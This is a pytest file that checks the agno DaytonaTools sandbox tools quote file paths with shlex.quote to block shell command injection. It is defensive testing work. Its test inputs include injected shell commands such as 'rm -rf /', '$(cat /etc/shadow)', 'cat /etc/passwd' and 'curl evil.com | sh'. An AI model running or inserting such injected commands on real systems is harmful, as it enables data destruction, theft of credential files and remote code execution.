"""Test that DaytonaTools properly sanitizes shell command arguments to prevent command injection."""

import shlex
import sys
from unittest.mock import MagicMock, patch

import pytest


# Create a proper mock Configuration class that can be patched
class MockConfiguration:
    def __init__(self, *args, **kwargs):
        self.verify_ssl = True


# Mock the daytona modules before importing DaytonaTools
mock_daytona_module = MagicMock()
mock_daytona_api_client_module = MagicMock()
mock_daytona_api_client_module.Configuration = MockConfiguration

sys.modules["daytona"] = mock_daytona_module
sys.modules["daytona_api_client"] = mock_daytona_api_client_module

# Import after mocking to avoid import errors
from agno.tools.daytona import DaytonaTools  # noqa: E402


@pytest.fixture
def mock_agent():
    """Create a mock agent with session_state."""
    agent = MagicMock()
    agent.session_state = {}
    return agent


@pytest.fixture
def daytona_tools_with_sandbox():
    """Create DaytonaTools with a mocked sandbox, returning (tools, mock_process)."""
    with (
        patch("agno.tools.daytona.Daytona") as mock_daytona_class,
        patch.dict("os.environ", {"DAYTONA_API_KEY": "test-key"}),
    ):
        mock_client = mock_daytona_class.return_value
        mock_sandbox = MagicMock()
        mock_sandbox.id = "test-sandbox-123"
        mock_client.create.return_value = mock_sandbox

        mock_process = MagicMock()
        mock_sandbox.process = mock_process

        tools = DaytonaTools()
        yield tools, mock_process


def _get_exec_command(mock_process, call_index=0):
    """Extract the shell command string from a process.exec call."""
    return mock_process.exec.call_args_list[call_index][0][0]


class TestShellCommandSanitization:
    """Verify that all shell commands use shlex.quote() for user-controlled arguments."""

    def test_cd_relative_path_quotes_cwd(self, mock_agent, daytona_tools_with_sandbox):
        """cd with relative path should quote the cwd in 'cd <cwd> && pwd'."""
        tools, mock_process = daytona_tools_with_sandbox

        # Set a working directory with spaces and shell metacharacters
        mock_agent.session_state["working_directory"] = "/home/user/my dir; rm -rf /"

        mock_pwd_result = MagicMock()
        mock_pwd_result.result = "/home/user/my dir; rm -rf /"

        mock_test_result = MagicMock()
        mock_test_result.result = "exists"

        mock_process.exec.side_effect = [mock_pwd_result, mock_test_result]

        tools.run_shell_command(mock_agent, "cd subdir")

        # The first exec call should quote the cwd
        cmd = _get_exec_command(mock_process, 0)
        cwd_value = "/home/user/my dir; rm -rf /"
        assert shlex.quote(cwd_value) in cmd
        assert f"cd {shlex.quote(cwd_value)} && pwd" == cmd

    def test_cd_absolute_path_quotes_new_path(self, mock_agent, daytona_tools_with_sandbox):
        """cd with absolute path should quote the path in 'test -d <path>'."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_test_result = MagicMock()
        mock_test_result.result = "exists"
        mock_process.exec.return_value = mock_test_result

        malicious_path = "/tmp/$(whoami)"
        tools.run_shell_command(mock_agent, f"cd {malicious_path}")

        cmd = _get_exec_command(mock_process, 0)
        # Path.resolve() may alter the path (e.g. /tmp -> /private/tmp on macOS)
        from pathlib import Path

        resolved_path = str(Path(malicious_path).resolve())
        assert shlex.quote(resolved_path) in cmd
        # Should NOT contain the raw unquoted resolved path
        assert f"test -d {resolved_path} " not in cmd

    def test_mkdir_quotes_parent_dir(self, mock_agent, daytona_tools_with_sandbox):
        """create_file should quote the parent directory in mkdir -p."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_process.exec.return_value = mock_result

        malicious_dir = "/home/daytona/evil dir; cat /etc/passwd"
        file_path = f"{malicious_dir}/file.txt"

        tools.create_file(mock_agent, file_path, "content")

        # First exec call is mkdir -p
        mkdir_cmd = _get_exec_command(mock_process, 0)
        assert f"mkdir -p {shlex.quote(malicious_dir)}" == mkdir_cmd

    def test_create_file_quotes_path(self, mock_agent, daytona_tools_with_sandbox):
        """create_file should quote the file path in 'cat > <path>'."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_process.exec.return_value = mock_result

        malicious_path = "/home/daytona/file'name.txt"

        tools.create_file(mock_agent, malicious_path, "content")

        # Second exec call is cat > <path> << 'EOF'...
        cat_cmd = _get_exec_command(mock_process, 1)
        assert f"cat > {shlex.quote(malicious_path)}" in cat_cmd

    def test_read_file_quotes_path(self, mock_agent, daytona_tools_with_sandbox):
        """read_file should quote the path in 'cat <path>'."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.result = "file contents"
        mock_process.exec.return_value = mock_result

        malicious_path = "/home/daytona/$(rm -rf /)"

        tools.read_file(mock_agent, malicious_path)

        cmd = _get_exec_command(mock_process, 0)
        assert f"cat {shlex.quote(malicious_path)}" == cmd

    def test_list_files_quotes_path(self, mock_agent, daytona_tools_with_sandbox):
        """list_files should quote the path in 'ls -la <path>'."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.result = "total 0"
        mock_process.exec.return_value = mock_result

        malicious_dir = "/home/daytona/`id`"

        tools.list_files(mock_agent, malicious_dir)

        cmd = _get_exec_command(mock_process, 0)
        assert f"ls -la {shlex.quote(malicious_dir)}" == cmd

    def test_delete_file_quotes_path(self, mock_agent, daytona_tools_with_sandbox):
        """delete_file should quote the path in both test -d and rm commands."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_check = MagicMock()
        mock_check.result = "file"
        mock_delete = MagicMock()
        mock_delete.exit_code = 0

        mock_process.exec.side_effect = [mock_check, mock_delete]

        malicious_path = "/home/daytona/evil'; rm -rf ~"

        # Path normalization may change the input; compute expected path
        from pathlib import Path

        expected_path = str(Path(malicious_path))

        tools.delete_file(mock_agent, malicious_path)

        # First call: test -d
        test_cmd = _get_exec_command(mock_process, 0)
        assert shlex.quote(expected_path) in test_cmd
        assert f"test -d {shlex.quote(expected_path)}" in test_cmd

        # Second call: rm -f (since it's reported as "file")
        rm_cmd = _get_exec_command(mock_process, 1)
        assert f"rm -f {shlex.quote(expected_path)}" == rm_cmd

    def test_delete_directory_quotes_path(self, mock_agent, daytona_tools_with_sandbox):
        """delete_file for a directory should quote the path in rm -rf."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_check = MagicMock()
        mock_check.result = "directory"
        mock_delete = MagicMock()
        mock_delete.exit_code = 0

        mock_process.exec.side_effect = [mock_check, mock_delete]

        malicious_path = "/home/daytona/evil dir"

        tools.delete_file(mock_agent, malicious_path)

        rm_cmd = _get_exec_command(mock_process, 1)
        assert f"rm -rf {shlex.quote(malicious_path)}" == rm_cmd

    def test_path_with_spaces_is_safe(self, mock_agent, daytona_tools_with_sandbox):
        """Paths with spaces should be properly quoted."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.result = "file contents"
        mock_process.exec.return_value = mock_result

        path_with_spaces = "/home/daytona/my documents/test file.txt"

        tools.read_file(mock_agent, path_with_spaces)

        cmd = _get_exec_command(mock_process, 0)
        # shlex.quote wraps in single quotes: '/home/daytona/my documents/test file.txt'
        assert shlex.quote(path_with_spaces) in cmd
        # The raw unquoted path should NOT appear as-is in the command
        assert cmd != f"cat {path_with_spaces}"

    def test_path_with_single_quotes_is_safe(self, mock_agent, daytona_tools_with_sandbox):
        """Paths containing single quotes should be properly escaped by shlex.quote."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.result = "file contents"
        mock_process.exec.return_value = mock_result

        path_with_quotes = "/home/daytona/it's a file.txt"

        tools.read_file(mock_agent, path_with_quotes)

        cmd = _get_exec_command(mock_process, 0)
        assert shlex.quote(path_with_quotes) in cmd
        # shlex.quote handles single quotes with: "it's" -> "it'\''s" pattern
        assert "cat " in cmd
        # Verify the single quote is escaped, not left raw inside single quotes
        assert "cat '/home/daytona/it's a file.txt'" not in cmd

    def test_path_with_semicolon_injection(self, mock_agent, daytona_tools_with_sandbox):
        """Paths with semicolons (command chaining) should be safely quoted."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.result = ""
        mock_process.exec.return_value = mock_result

        injected_path = "/tmp/foo; curl evil.com | sh"

        tools.list_files(mock_agent, injected_path)

        cmd = _get_exec_command(mock_process, 0)
        # Path normalizes this, so compute expected
        from pathlib import Path

        expected_path = str(Path(injected_path))
        quoted = shlex.quote(expected_path)
        assert f"ls -la {quoted}" == cmd
        # The semicolon must be inside quotes, not acting as a command separator
        assert "; curl" not in cmd.replace(quoted, "")

    def test_path_with_backtick_injection(self, mock_agent, daytona_tools_with_sandbox):
        """Paths with backticks (command substitution) should be safely quoted."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.result = "file contents"
        mock_process.exec.return_value = mock_result

        injected_path = "/tmp/`whoami`"

        tools.read_file(mock_agent, injected_path)

        cmd = _get_exec_command(mock_process, 0)
        assert f"cat {shlex.quote(injected_path)}" == cmd

    def test_path_with_dollar_paren_injection(self, mock_agent, daytona_tools_with_sandbox):
        """Paths with $() (command substitution) should be safely quoted."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_check = MagicMock()
        mock_check.result = "file"
        mock_delete = MagicMock()
        mock_delete.exit_code = 0
        mock_process.exec.side_effect = [mock_check, mock_delete]

        injected_path = "/tmp/$(cat /etc/shadow)"

        tools.delete_file(mock_agent, injected_path)

        test_cmd = _get_exec_command(mock_process, 0)
        assert shlex.quote(injected_path) in test_cmd
        rm_cmd = _get_exec_command(mock_process, 1)
        assert shlex.quote(injected_path) in rm_cmd

    def test_change_directory_quotes_path(self, mock_agent, daytona_tools_with_sandbox):
        """change_directory should quote the path via run_shell_command's cd handling."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_test_result = MagicMock()
        mock_test_result.result = "exists"
        mock_process.exec.return_value = mock_test_result

        malicious_dir = "/home/user/evil; rm -rf /"

        tools.change_directory(mock_agent, malicious_dir)

        # change_directory delegates to run_shell_command which handles cd specially
        from pathlib import Path

        resolved_dir = str(Path(malicious_dir).resolve())
        cmd = _get_exec_command(mock_process, 0)
        assert shlex.quote(resolved_dir) in cmd
        # The raw unquoted path must not appear as a bare argument
        assert f"test -d {resolved_dir} " not in cmd

    def test_change_directory_stores_resolved_path(self, mock_agent, daytona_tools_with_sandbox):
        """change_directory should store the resolved (not raw) path in session state."""
        tools, mock_process = daytona_tools_with_sandbox

        mock_test_result = MagicMock()
        mock_test_result.result = "exists"
        mock_process.exec.return_value = mock_test_result

        tools.change_directory(mock_agent, "/home/user/safe_dir")

        from pathlib import Path

        resolved = str(Path("/home/user/safe_dir").resolve())
        # The stored working directory should be the resolved path from run_shell_command,
        # not the raw input value
        stored = mock_agent.session_state.get("working_directory")
        assert stored == resolved
